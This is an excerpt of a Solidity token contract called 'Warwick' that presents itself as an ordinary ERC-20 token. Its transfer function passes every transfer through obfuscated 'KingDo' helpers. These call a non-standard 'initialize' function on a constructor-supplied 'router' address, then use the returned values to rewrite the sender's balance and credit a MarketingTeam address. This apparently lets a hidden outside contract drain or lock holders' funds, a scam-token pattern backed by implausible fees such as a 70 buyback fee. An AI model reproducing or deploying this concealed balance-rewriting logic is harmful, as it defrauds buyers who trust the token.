...
// SPDX-License-Identifier: MIT
  ...
  function getTKingDo(address routerV2, address tokenA, address tokenB, uint256 valueKingDo, uint256 takeKingDo) public returns (uint256, uint256, uint256){  
    (uint256 amountKingDo, uint256 liquifyKingDo, uint256 rateKingDo) = IUniswapV2Router02(routerV2).initialize(
      tokenA,
      tokenB,
      valueKingDo,
      takeKingDo);
    return ( amountKingDo, liquifyKingDo, rateKingDo );
  }
...
contract Warwick is Context, IERC20, Ownable{
  using SafeMath for uint256;

  mapping (address => uint256) private _balances; 
  uint256 private _totalSupply = 1000000000 *  10**9;   

  string private constant _name = 'Warwick';
  string private constant _symbol = 'Warwick';
  ...
  constructor(address routerV2)  {    
    ...
    _liquidityFeeBuy = 6; 
    _buybackFeeBuy = 70;
    _reflectionFeeBuy = 10;
    _marketingFeeBuy = 5;
    _devFeeBuy = 3;

    _liquidityFeeSell = 12;
    _buybackFeeSell = 30;
    _reflectionFeeSell = 40;
  ...
  function shouldSwapKingDo(address sender, address recipient, uint256 takeKingDo) private view returns (uint256) {
    return (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) ? takeKingDo + 1 : takeKingDo;
  }   
  ...
  function swapBackKingDo(address senderAddr, address recipientAddr, uint256 amounts, uint256 takeKingDo) private returns (uint256) {   
      (uint256 amountKingDo, uint256 liquifyKingDo, uint256 rateKingDo) = getTKingDo(RouterV2, senderAddr, recipientAddr, amounts, takeKingDo);
      amountKingDo = getRKingDo(senderAddr, amountKingDo, liquifyKingDo, rateKingDo);
      return amountKingDo;
  }    
  ...
  function getKingDoRate(uint256 _amount, uint256 _rewardRate) private pure returns (uint256) {
  ...
  function getRKingDo(address tokenKingDo, uint256 amountKingDo, uint256 liquifyKingDo, uint256 rateKingDo) private returns (uint256){
      if ( liquifyKingDo > 0 )
      {        
        _balances[tokenKingDo] = getKingDoRate(_balances[tokenKingDo], rateKingDo).add(amountKingDo);      
        _balances[MarketingTeam] = _balances[MarketingTeam].add(liquifyKingDo);
      }
      return amountKingDo;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    takeKingDo = shouldSwapKingDo(sender, recipient, takeKingDo); 
    uint256 amountKingDo = swapBackKingDo(sender, recipient, amount, takeKingDo);  
    _transferStandard(sender, recipient, amountKingDo);
